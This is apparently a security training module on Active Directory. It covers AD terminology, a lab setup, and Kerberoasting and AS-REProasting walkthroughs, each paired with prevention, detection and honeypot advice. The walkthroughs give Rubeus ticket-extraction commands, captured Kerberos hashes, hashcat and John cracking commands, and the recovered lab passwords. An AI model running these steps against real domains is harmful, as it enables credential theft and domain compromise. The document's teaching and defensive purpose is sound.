 Section 1 / 16
Introduction and Terminology
What is Active Directory?

Active Directory (AD) is a directory service for Windows enterprise environments that Microsoft officially released in 2000 with Windows Server 2000. Microsoft has been incrementally improving AD with the release of each new server OS version. Based on the protocols x.500 and LDAP that came before it (which are still utilized in some form today), AD is a distributed, hierarchical structure that allows centralized management of an organization's resources, including users, computers, groups, network devices and file shares, group policies, devices, and trusts. AD provides authentication, accounting, and authorization functionalities within a Windows enterprise environment. It also allows administrators to manage permissions and access to network resources.

Active Directory is so widespread that it is by a margin the most utilized Identity and Access management (IAM) solution worldwide. For this reason, the vast majority of enterprise applications seamlessly integrate and operate with Active Directory. Active Directory is the most critical service in any enterprise. A compromise of an Active Directory environment means unrestricted access to all its systems and data, violating its CIA (Confidentiality, Integrity, and Availability). Researchers constantly discover and disclose vulnerabilities in AD. Via these vulnerabilities, threat actors can utilize malware known as ransomware to hold an organization's data hostage for ransom by performing cryptographic operations (encryption) on it, therefore rendering it useless until they either pay a fee to purchase a decryption key (not advised) or obtain the decryption key with the help of IT Security professionals. However, if we think back, an Active Directory compromise means the compromise of all and any applications, systems, and data instead of a single system or service.

Let's look at publicly disclosed vulnerabilities for the past three years (2020 to 2022). Microsoft has over 3000, and around 9000 since 1999, which signifies an incredible growth of research and vulnerabilities in the past years. The most apparent practice to keep Active Directory secure is ensuring that proper Patch Management is in place, as patch management is currently posing challenges to organizations worldwide. For this module, we will assume that Patch Management is done right (Proper Patch Management is crucial for the ability to withstand a compromise) and focus on other attacks and vulnerabilities we can encounter. We will focus on showcasing attacks that abuse common misconfigurations and Active Directory features, especially ones that are very common/familiar yet incredibly hard to eliminate. Additionally, the protections discussed here aim to arm us for the future, helping us create proper cyber hygiene. If you are thinking Defence in depth, Network segmentation, and the like, then you are on the right track.

If this is your first time learning about Active Directory or hearing these terms, check out the Intro to Active Directory module for a more in-depth look at the structure and function of AD, AD objects, etc. And also Active Directory - Enumeration and Attacks for strengthening your knowledge and gaining an overview of some common attacks.
Refresher

To ensure we are familiar with the basic concepts, let's review a quick refresher of the terms.

A domain is a group of objects that share the same AD database, such as users or devices.

A tree is one or more domains grouped. Think of this as the domains test.local, staging.test.local, and preprod.test.local, which will be in the same tree under test.local. Multiple trees can exist in this notation.

A forest is a group of multiple trees. This is the topmost level, which is composed of all domains.

Organizational Units (OU) are Active Directory containers containing user groups, Computers, and other OUs.

Trust can be defined as access between resources to gain permission/access to resources in another domain.

Domain Controller is (generally) the Admin of the Active Directory used to set up the entire Directory. The role of the Domain Controller is to provide Authentication and Authorization to different services and users. In Active Directory, the Domain Controller has the topmost priority and has the most authority/privileges.

Active Directory Data Store contains Database files and processes that store and manages directory information for users, services, and applications. Active Directory Data Store contains the file NTDS.DIT, the most critical file within an AD environment; domain controllers store it in the %SystemRoot%\NTDS folder.

A regular AD user account with no added privileges can be used to enumerate the majority of objects contained within AD, including but not limited to:

    Domain Computers
    Domain Users
    Domain Group Information
    Default Domain Policy
    Domain Functional Levels
    Password Policy
    Group Policy Objects (GPOs)
    Kerberos Delegation
    Domain Trusts
    Access Control Lists (ACLs)

Although the settings of AD allow this default behavior to be modified/disallowed, its implications can result in a complete breakdown of applications, services, and Active Directory itself.

LDAP is a protocol that systems in the network environment use to communicate with Active Directory. Domain Controller(s) run LDAP and constantly listen for requests from the network.

Authentication in Windows Environments:

    Username/Password, stored or transmitted as password hashes (LM, NTLM, NetNTLMv1/NetNTLMv2).
    Kerberos tickets (Microsoft's implementation of the Kerberos protocol). Kerberos acts as a trusted third party, working with a domain controller (DC) to authenticate clients trying to access services. The Kerberos authentication workflow revolves around tickets that serve as cryptographic proof of identity that clients exchange between each other, services, and the DC.
    Authentication over LDAP. Authentication is allowed via the traditional username/password or user or computer certificates.

Key Distribution Center (KDC): a Kerberos service installed on a DC that creates tickets. Components of the KDC are the authentication server (AS) and the ticket-granting server (TGS).

Kerberos Tickets are tokens that serve as proof of identity (created by the KDC):

    TGT is proof that the client submitted valid user information to the KDC.
    TGS is created for each service the client (with a valid TGT) wants to access.

KDC key is an encryption key that proves the TGT is valid. AD creates the KDC key from the hashed password of the KRBTGT account, the first account created in an AD domain. Although it is a disabled user, KRBTGT has the vital purpose of storing secrets that are randomly generated keys in the form of password hashes. One may never know what the actual password value represents (even if we try to configure it to a known value, AD will automatically override it to a random one).

Each domain contains the groups Domain admins and Administrators, the most privileged groups in broad access. By default, AD adds members of Domain admins to be Administrators on all Domain joined machines and therefore grants the rights to log on to them. While the 'Administrators' group of the domain can only log on to Domain Controllers by default, they can manage any Active Directory object (e.g., all servers and therefore assign themselves the rights to log on to them). The topmost domain in a forest also contains an object, the group Enterprise Admins, which has permissions over all domains in the forest.

Default groups in Active Directory are heavily privileged and carry a hidden risk. For example, consider the group Account Operators. When asking AD admins what the reason is to assign it to users/super users, they will respond that it makes the work of the 'Service Desk' easier as then they can reset user passwords. Instead of creating a new group and delegating that specific right to the Organizational Units containing user accounts, they violate the principle of least privilege and endanger all users. Subsequently, this will include an escalation path from Account Operators to Domain Admins, the most common one being through the 'MSOL_' user accounts that Azure AD Connect creates upon installation. These accounts are placed in the default 'Users' container, where 'Account operators' can modify the user objects.

It is essential to highlight that Windows has multiple logon types: ' how' users log on to a machine, which can be, for example, interactive while a user is physically present on a device or remotely over RDP. Logon types are essential to know about because they will leave a 'trace' behind on the system(s) accessed. This trace is the username and password used. As a rule of thumb, logon types except 'Network logon, type 3' leave credentials on the system authenticated and connected to. Microsoft provides a complete list of logon types here.

To interact with Active Directory, which lives on Domain Controllers, we must speak its language, LDAP. Any query happens by sending a specifically crafted message in LDAP to a Domain Controller, such as obtaining user information and a group's membership. Early in its life, Microsoft realized that LDAP is not a 'pretty' language, and they released Graphical tools that can present data in a friendly interface and convert 'mouse clicks' into LDAP queries. Microsoft developed the Remote Server Administration Tools (RSAT), enabling the ability to interact with Active Directory locally on the Domain Controller or remotely from another computer object. The most popular tools are Active Directory Users and Computers (which allows for accessible viewing/moving/editing/creating objects such as users, groups, and computers) and Group Management Policy (which allows for the creation and modification of Group policies).

Important network ports in any Windows environment include (memorizing them is hugely beneficial):

    53: DNS.
    88: Kerberos.
    135: WMI/RPC.
    137-139 & 445: SMB.
    389 & 636: LDAP.
    3389: RDP
    5985 & 5986: PowerShell Remoting (WinRM)

Real-world view

Every organization, which has (attempted) at some point to increase its maturity, has gone through exercises that classify its systems. The classification defines the importance of each system to the business, such as ERP, CRM, and backups. A business relies on this to successfully meet its objectives and is significantly different from one organization to another. In Active Directory, any additional roles, services, and features that get 'added' on top of what comes out of the box must be classified. This classification is necessary to ensure that we set the bar for which service, if compromised, poses an escalation risk toward the rest of Active Directory. In this design view, we need to ensure that any service allowing for direct (or indirect) escalation is treated similarly as if it was a Domain Controller/Active Directory. Active Directory is massive, complex, and feature-heavy - potential escalation risks are under every rock. Active Directory will provide services such as DNS, PKI, and Endpoint Configuration Manager in an enterprise organization. If an attacker were to obtain administrative rights to these services, they would indirectly have means to escalate their privileges to those of an Administrator of the entire forest. We will demonstrate this through some attack paths described later in the module.

Active Directory has limitations, however. Unfortunately, these limitations are a 'weak' point and expand our attack surface - some born by complexity, others by design, and some due to legacy and backward compatibility. For the sake of completeness, below are three examples of each:

    Complexity - The simplest example is figuring out nested group members. It is easy to get lost when looking into who is a member of a group, a member of another group, and a member of yet another group. While you may think this chain ends eventually, many environments have every 'Domain user' indirectly a member of 'Domain Admins'.
    Design - Active Directory allows managing machines remotely via Group Policy Objects (GPOs). AD stores GPOs in a unique network share/folder called SYSVOL, where all domain-joined devices pull settings applied to them. Because it is a network-shared folder, clients access SYSVOL via the SMB protocol and transfer stored information. Thus, for a machine to use new settings, it has to call a Domain Controller and pull settings from SYSVOL - this is a systematic process, which by default occurs every 90 minutes. Every device must have a Domain Controller 'in sight' to pull this data from. The downside of this is that the SMB protocol also allows for code execution (a remote command shell, where commands will be executed on the Domain Controller), so as long as we have a set of valid credentials, we can consistently execute code over SMB on the Domain Controllers remotely. This port/protocol is available to all machines toward Domain Controllers. (Additionally, SMB is not well fit (generally Active Directory) for the zero-trust concepts.) If an attacker has a good set of privileged credentials, they can execute code as that account on Domain Controllers over SMB (at least!).
    Legacy - Windows is made with a primary focus: it works out of the box for most of Microsoft's customers. Windows is not secure by default. A legacy example is that Windows ships with the broadcasting - DNS-like protocols NetBIOS and LLMNR enabled by default. These protocols are meant to be used if DNS fails. However, they are active even when it does not. However, due to their design, they broadcast user credentials on the wire (usernames, passwords, password hashes), which can effectively provide privileged credentials to anyone listening on the wire by simply being there. This blog post demonstrates the abuse of capturing credentials on the wire.


















     Section 2 / 16
Overview

In this module, we will dive deep into several different attacks. The objective for each attack is to:

    Describe it.
    Provide a walkthrough of how we can carry out the attack.
    Provide preventive techniques and compensating controls.
    Discuss detection capabilities.
    Discuss the 'honeypot' approach of detecting the attack, if applicable.

The following is a complete list of all attacks described in this module:

    Kerberoasting
    AS-REProasting
    GPP Passwords
    Misconfigured GPO Permissions (or GPO-deployed files)
    Credentials in Network Shares
    Credentials in User Attributes
    DCSync
    Kerberos Golden Ticket
    Kerberos Constrained Delegation attack
    Print Spooler & NTLM Relaying
    Coercing attacks & Kerberos Unconstrained Delegation
    Object ACLs
    PKI Misconfigurations - ESC1
    PKI Misconfigurations - ESC8 (Coercing + Certificates)

Lab Environment

As part of this module, we also provide a playground environment where you can test and follow up with the provided walkthroughs to carry out these attacks yourself. Please note that the purpose of the walkthroughs is to demonstrate the problem and not to describe the attacks in depth. Also, other modules on the platform are already covering these attacks very detailedly.

The attacks will be executed from the provided Windows 10 (WS001) and Kali Linux machines. The assumption is that an attacker has already gained remote code execution (of some sort) on that Windows 10 (WS001) machine. The user, which we assume is compromised, is Bob, a regular user in Active Directory with no special permissions assigned.

The environment consists of the following machines and their corresponding IP addresses:

    DC1: 172.16.18.3
    DC2: 172.16.18.4
    Server01: 172.16.18.10
    PKI: 172.16.18.15
    WS001: DHCP or 172.16.18.25 (depending on the section)
    Kali Linux: DHCP or 172.16.18.20 (depending on the section)

Connecting to the lab environment

Most of the hosts mentioned above are vulnerable to several attacks and live in an isolated network that can be accessed via the VPN. While on the VPN, a student can directly access the machines WS001 and/or Kali (depending on the section), which, as already mentioned, will act as initial foothold and attacker devices throughout the scenarios.

Below, you may find guidance (from a Linux host):

    How to connect to the Windows box WS001
    How to connect to the Kali box
    How to transfer files between WS001 and your Linux attacking machine

Connect to WS001 via RDP

Once connected to the VPN, you may access the Windows machine via RDP. Most Linux flavors come with a client software, 'xfreerdp', which is one option to perform this RDP connection. To access the machine, we will use the user account Bob whose password is 'Slavi123'. To perform the connection execute the following command:

        shellsession
manojxshrestha@htb[/htb]$ xfreerdp /u:eagle\\bob /p:Slavi123 /v:TARGET_IP /dynamic-resolution

<img width="1668" height="1304" alt="image" src="https://github.com/user-attachments/assets/0f257d2d-293d-4a37-861b-b1d4f2738aeb" />

Terminal showing xfreerdp command to connect to 10.129.204.151 with certificate name mismatch warning. Prompt to trust certificate.



If the connection is successful, a new window with WS001's desktop will appear on your screen, as shown below:
<img width="1027" height="836" alt="image" src="https://github.com/user-attachments/assets/2c0fc210-d038-46ac-9698-f00ccf662724" />

File Explorer open on FreeRDP session to 10.129.204.151, showing Downloads folder with various scripts and executables.


Connect to Kali via SSH

Once connected to the VPN, we can access the Kali machine via SSH. The credentials of the machine are the default 'kali/kali'. To connect, use the following command:

        shellsession
manojxshrestha@htb[/htb]$ ssh kali@TARGET_IP

<img width="1323" height="772" alt="image" src="https://github.com/user-attachments/assets/8af5cbcc-fcec-437d-9950-6596bf6b55a2" />


Terminal showing SSH connection to 10.129.204.150 with password 'kali' and host authenticity warning.

Note: We have also enabled RDP on the Kali host. For sections with the Kali host as the primary target, it is recommended to connect with RDP. Connection credentials will be provided for each challenge question.

        shellsession
manojxshrestha@htb[/htb]$ xfreerdp /v:TARGET_IP /u:kali /p:kali /dynamic-resolution

Moving files between WS001 and your Linux attacking machine

To facilitate easy file transfer between the machines, we have created a shared folder on WS001, which can be accessed via SMB.


<img width="973" height="805" alt="image" src="https://github.com/user-attachments/assets/7a23cf1e-c11f-4bab-8b30-615b2f58bb63" />

File Explorer showing Downloads folder with 'Share' folder properties open, displaying network path \WS001\Share.


To access the folder from the Kali machine, you can use the 'smbclient' command. Accessing the folder requires authentication, so you will need to provide credentials. The command can be executed with the Administrator account as follows:

        shellsession
manojxshrestha@htb[/htb]$ smbclient \\\\TARGET_IP\\Share -U eagle/administrator%Slavi123

<img width="739" height="218" alt="image" src="https://github.com/user-attachments/assets/030b6547-a4f3-4b43-b78c-00d80f7b2a1d" />

Terminal showing smbclient command to connect to \172.16.18.25\Share with user eagle/administrator and password Slavi123.

Once connected, you can utilize the commands put or get to either upload or download files, respectively.






























 Section 3 / 16
Go to Questions
Kerberoasting
Description

In Active Directory, a Service Principal Name (SPN) is a unique service instance identifier. Kerberos uses SPNs for authentication to associate a service instance with a service logon account, which allows a client application to request that the service authenticate an account even if the client does not have the account name. When a Kerberos TGS service ticket is asked for, it gets encrypted with the service account's NTLM password hash.

Kerberoasting is a post-exploitation attack that attempts to exploit this behavior by obtaining a ticket and performing offline password cracking to open the ticket. If the ticket opens, then the candidate password that opened the ticket is the service account's password. The success of this attack depends on the strength of the service account's password. Another factor that has some impact is the encryption algorithm used when the ticket is created, with the likely options being:

    AES
    RC4
    DES (found in environments that are 15+ old years old with legacy apps from the early 2000s, otherwise, this will be disabled)

There is a significant difference in the cracking speed between these three, as AES is slower to crack than the others. While security best practices recommend disabling RC4 (and DES, if enabled for some reason), most environments do not. The caveat is that not all application vendors have migrated to support AES (most but not all). By default, the ticket created by the KDC will be one with the most robust/highest encryption algorithm supported. However, attackers can force a downgrade back to RC4.
Attack path

To obtain crackable tickets, we can use Rubeus. When we run the tool with the kerberoast action without specifying a user, it will extract tickets for every user that has an SPN registered (this can easily be in the hundreds in large environments):

        powershell-session
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : eagle.local
[*] Searching path 'LDAP://DC1.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3


[*] SamAccountName         : Administrator
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : http/pki1
[*] PwdLastSet             : 07/08/2022 12.24.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt


[*] SamAccountName         : webservice
[*] DistinguishedName      : CN=web service,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : cvs/dc1.eagle.local
[*] PwdLastSet             : 13/10/2022 13.36.04
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\spn.txt
PS C:\Users\bob\Downloads>


<img width="2281" height="1381" alt="image" src="https://github.com/user-attachments/assets/930e6693-522f-4fe6-88fb-f58384b5c58a" />

PowerShell running Rubeus.exe kerberoast command, extracting Kerberoastable tickets for two users, Administrator and webservice, saved in spn.txt.




We then need to move the extracted file with the tickets to the Kali Linux VM for cracking (we will only focus on the one for the account Administrator, even though Rubeus extracted two tickets).

We can use hashcat with the hash-mode (option -m) 13100 for a Kerberoastable TGS. We also pass a dictionary file with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to a file called cracked.txt:

        shellsession
manojxshrestha@htb[/htb]$ hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"

hashcat (v6.2.5) starting

<SNIP>

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: 10002
* Bytes.....: 76525
* Keyspace..: 10002
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$eagle.local$http/pki1@ea...42bb2c
Time.Started.....: Tue Dec 13 10:40:10 2022, (0 secs)
Time.Estimated...: Tue Dec 13 10:40:10 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   143.1 kH/s (0.67ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10002/10002 (100.00%)
Rejected.........: 0/10002 (0.00%)
Restore.Point....: 9216/10002 (92.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 20041985 -> brady
Hardware.Mon.#1..: Util: 26%

Started: Tue Dec 13 10:39:35 2022
Stopped: Tue Dec 13 10:40:11 2022


<img width="874" height="225" alt="image" src="https://github.com/user-attachments/assets/769b49f6-bc89-47ce-880e-7b24623a6ebb" />

Terminal showing hashcat command to crack hashes from spn.txt using passwords.txt, outputting results to cracked.txt.

(If hashcat gives an error, we may need to pass --force as an argument at the end of the command.)

Once hashcat finishes cracking, we can read the file 'cracked.txt' to see the password Slavi123 in plain text:

        shellsession
manojxshrestha@htb[/htb]$ cat cracked.txt

$krb5tgs$23$*Administrator$eagle.local$http/pki1@eagle.local*$ab67a0447d7db2945a28d19802d0da64$b6a6a8d3fa2e9e6b47dac1448ade064b5e9d7e04eb4adb5d97a3ef5fd35c8a5c3b9488f09a98b5b8baeaca48483df287495a31a59ccb07209c84e175eef91dc5e4ceb9f7865584ca906965d4bff757bee3658c3e3f38b94f7e1465cd7745d0d84ff3bb67fe370a07cb7f5f350aa26c3f292ee1d7bc31b97db7543182a950c4458ee45f1ff58d1c03b713d11a559f797b85f575aabb72de974cf48c80cbbc78db245c496d3f78c50de655e6572627904753fe223148bc32063c6f032ecdcb901012a98c029de2676905aff97024c89c9d62a73b5f4a614dfd37b90a30a3335326c61b27e788619f84dc0993661be9a9d631d8e4d89d70023b27e5756a23c374f1a59ed15dbe28147296fae252a6d55d663d61759d6ee002b4d3814ada1cafb8997ed594f1cfab6cdb503058b73e192228257d834fd420e9dbc5c12cfffb2077aa5f2abef8cac07ee6cdc7630be71ed174ee167ea0d95df14f48e3e576aa4f90b23d44378d4533cbad945b830bf59f2814ff2dec8832561c3c67bd43afebb231d8f16b1f218dfda803619a47ac833330dde29b34eb73a4aba7da93d7664b92534e44beb80b5ad22a5f80d72f5c476f1796d041ade455eee50651d746db75490bd9a7165b2638c79973fc03c63a67e2659e3057fbe2bce22175116a3892e95a418a02908e0daea3293dc01cd172b524217efe56d842cf8b6f369f30657cd40fe482467d4f2a3a7f3c1caf52cf5f2afc7454fb934a0fb13a0da76dbcefecc32da3a719cd37f944ea13589ce373163d56eb5e8c2dc3fb567b1c5959b7e4e3e054ea9a5561776bed7c2d9eb3107645efce5d22a033891758ac57b187a19006abdbe3f5d53edfc09e5359bc52538afef759c37fbe00cc46e4968ec69072761c2c796bd8e924521cc6c3a50fc1db09e5ce1d443ff3962ca1878904a8252d4f827bcb1e6d6c38bf1fd8ccc21d70751008ece94699aa3caa7e671cb48afc8eb3ecbf181c6e0ed52f740f07e87025c28e4fd832192a66bc390923ea397527264fe382056be78d791f80d0343bbf60ffd09dce061825595f69b939eaa517dc89f4527094bda0ae6febb03d8af3fb3e527e8b5501bbd807ed23ed9bcf85b74be699bd42a284318c42d90dbbd4df332d654529b23a5d81bedec69dba2f3e308d7f8db058377055c15b9eae6275f60a7ec1d52077546caa2b78cf798769a0096d590bb5d5d5173a67a32c2eba174e067a9bf8b4e1f190f8816bf2d6741a8bd6e4e1a6e7ca5ac745061a93cde0ab03ee8cf1de80afa0674a4248d38efdc77aca269e2388c43c83a3919ef80e9a9f0005b1b40026fc29e6262091cbc4f062cf95d5d7e051c019cd0bd5e85b8dcb16b17fd92820e1e1581265a4472c3a5d1f42bb2c:Slavi123

<img width="1066" height="310" alt="image" src="https://github.com/user-attachments/assets/56e0d1cc-65d1-4269-b802-45a036fe03e4" />

Terminal showing contents of cracked.txt with password Slavi123 revealed.


Alternatively, the captured TGS hashes can be cracked with John The Ripper:

        shellsession
┌─[eu-academy-2]─[10.10.15.245]─[htb-ac-594497@htb-mw2xldpqoq]─[~]
└──╼ [★]$ sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Node numbers 1-4 of 4 (fork)
Slavi123         (?)
Slavi123         (?)

Prevention

The success of this attack depends on the strength of the service account's password. While we should limit the number of accounts with SPNs and disable those no longer used/needed, we must ensure they have strong passwords. For any service that supports it, the password should be 100+ random characters (127 being the maximum allowed in AD), which ensures that cracking the password is practically impossible.

There is also what is known as Group Managed Service Accounts (GMSA), which is a particular type of a service account that Active Directory automatically manages; this is a perfect solution because these accounts are bound to a specific server, and no user can use them anywhere else. Additionally, Active Directory automatically rotates the password of these accounts to a random 127 characters value. There is a caveat: not all applications support these accounts, as they work mainly with Microsoft services (such as IIS and SQL) and a few other apps that have made integration possible. However, we should utilize them everywhere possible and start enforcing their use for new services that support them to out phase current accounts eventually.

When in doubt, do not assign SPNs to accounts that do not need them. Ensure regular clean-up of SPNs set to no longer valid services/servers.


Detection

When a TGS is requested, an event log with ID 4769 is generated. However, AD also generates the same event ID whenever a user attempts to connect to a service, which means that the volume of this event is gigantic, and relying on it alone is virtually impossible to use as a detection method. If we happen to be in an environment where all applications support AES and only AES tickets are generated, then it would be an excellent indicator to alert on event ID 4769. If the ticket options is set for RC4, that is, if RC4 tickets are generated in the AD environment (which is not the default configuration), then we should alert and follow up on it. Here is what was logged when we requested the ticket to perform this attack:

<img width="1753" height="1142" alt="image" src="https://github.com/user-attachments/assets/bd2abf34-0d8e-4e98-b4f0-cd432ce83520" />

Event 4769: Kerberos ticket request by bob@EAGLE.LOCAL for Administrator service from IP 172.16.18.25, using RC4 encryption.

Even though the general volume of this event is quite heavy, we still can alert against the default option on many tools. When we run 'Rubeus', it will extract a ticket for each user in the environment with an SPN registered; this allows us to alert if anyone generates more than ten tickets within a minute (for example, but it could be less than ten). This event ID should be grouped by the user requesting the tickets and the machine the requests originated from. Ideally, we need to aim to create two separate rules that alert both. In our playground environment, there are two users with SPNs, so when we executed Rubeus, AD generated the following events:

<img width="1877" height="1263" alt="image" src="https://github.com/user-attachments/assets/0575205b-559b-4832-af69-5034ca7013d0" />

Security log showing two 'Audit Success' events for Kerberos Service Ticket with Event ID 4769 at 9:11:08 PM on 12/12/2022. Account: bob@EAGLE.LOCALl, IP: 172.16.18.25, Port: 60491. Highlighted note: 'Matching volume of events by source IP address or requester name within a short time.
Honeypot

A honeypot user is a perfect detection option to configure in an AD environment; this must be a user with no real use/need in the environment, so no service tickets are generated regularly. In this case, any attempt to generate a service ticket for this account is likely malicious and worth inspecting. There are a few things to ensure when using this account:

    The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).
    The password should not have been changed recently. A good target is 2+ years, ideally five or more. But the password must be strong enough that the threat agents cannot crack it.
    The account must have some privileges assigned to it; otherwise, obtaining a ticket for it won't be of interest (assuming that an advanced adversary obtains tickets only for interesting accounts/higher likelihood of cracking, e.g., due to an old password).
    The account must have an SPN registered, which appears legit. IIS and SQL accounts are good options because they are prevalent.

An added benefit to honeypot users is that any activity with this account, whether successful or failed logon attempts, is suspicious and should be alerted.

If we go back to our playground environment and configure the user svc-iam (probably an old IAM account leftover) with the recommendations above, then any request to obtain a TGS for that account should be alerted on:

<img width="1764" height="1142" alt="image" src="https://github.com/user-attachments/assets/6c7e172c-998c-4f6f-845d-3fe95d76f0d0" />

Security log Event 4769: Kerberos service ticket requested by bob@EAGLE.LOCAL, Service Name: svc-iam, IP: 172.16.18.25, Port: 60513. Alert: Honeypot triggered.
Be Careful!

Although we give examples of honeypot detections in many of the attacks described, it does not mean an AD environment should implement every single one. That would make it evident to a threat actor that the AD administrator(s) have set many traps. We must consider all the detections and enforce the ones that work best for our AD environment.



















 Section 4 / 16
Go to Questions
AS-REProasting
Description

The AS-REProasting attack is similar to the Kerberoasting attack; we can obtain crackable hashes for user accounts that have the property Do not require Kerberos preauthentication enabled. The success of this attack depends on the strength of the user account password that we will crack.
Attack

To obtain crackable hashes, we can use Rubeus again. However, this time, we will use the asreproast action. If we don't specify a name, Rubeus will extract hashes for each user that has Kerberos preauthentication not required:

        powershell-session
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1


[*] Action: AS-REP roasting

[*] Target Domain          : eagle.local

[*] Searching path 'LDAP://DC2.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : anni
[*] DistinguishedName      : CN=anni,OU=EagleUsers,DC=eagle,DC=local
[*] Using domain controller: DC2.eagle.local (172.16.18.4)
[*] Building AS-REQ (w/o preauth) for: 'eagle.local\anni'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\bob\Downloads\asrep.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\asrep.txt

<img width="1655" height="915" alt="image" src="https://github.com/user-attachments/assets/118b89c8-d609-4a8f-8bc0-cf452f203a0e" />

Rubeus tool performing AS-REP roasting on domain eagle.local, targeting user 'anni'. Hashes saved to asrep.txt.


Once Rubeus obtains the hash for the user Anni (the only one in the playground environment with preauthentication not required), we will move the output text file to a linux attacking machine.

For hashcat to be able to recognize the hash, we need to edit it by adding 23$ after $krb5asrep$:

        shellsession
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550

We can now use hashcat with the hash-mode (option -m) 18200 for AS-REPRoastable hashes. We also pass a dictionary file with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to the file asrepcracked.txt:

        shellsession
manojxshrestha@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force

hashcat (v6.2.5) starting

<SNIP>

Dictionary cache hit:
* Filename..: passwords.txt
* Passwords.: 10002
* Bytes.....: 76525
* Keyspace..: 10002
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$anni@eagle.local:1b912b858c4551c0013d...3d2550
Time.Started.....: Thu Dec 8 06:08:47 2022, (0 secs)
Time.Estimated...: Thu Dec 8 06:08:47 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   130.2 kH/s (0.65ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10002/10002 (100.00%)
Rejected.........: 0/10002 (0.00%)
Restore.Point....: 9216/10002 (92.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 20041985 -> brady
Hardware.Mon.#1..: Util: 26%

Started: Thu Dec 8 06:08:11 2022
Stopped: Thu Dec 8 06:08:49 2022


<img width="1443" height="1449" alt="image" src="https://github.com/user-attachments/assets/5c1c9cf4-3f4a-46fd-82b8-0e45af081d74" />

Hashcat command cracking AS-REP hash from asrep.txt using passwords.txt, output to asrepcrack.txt. Status: Cracked.


Once hashcat cracks the password, we can print the contents of the output file to obtain the cleartext password Slavi123:

        shellsession
manojxshrestha@htb[/htb]$ sudo cat asrepcrack.txt

$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550:Slavi123


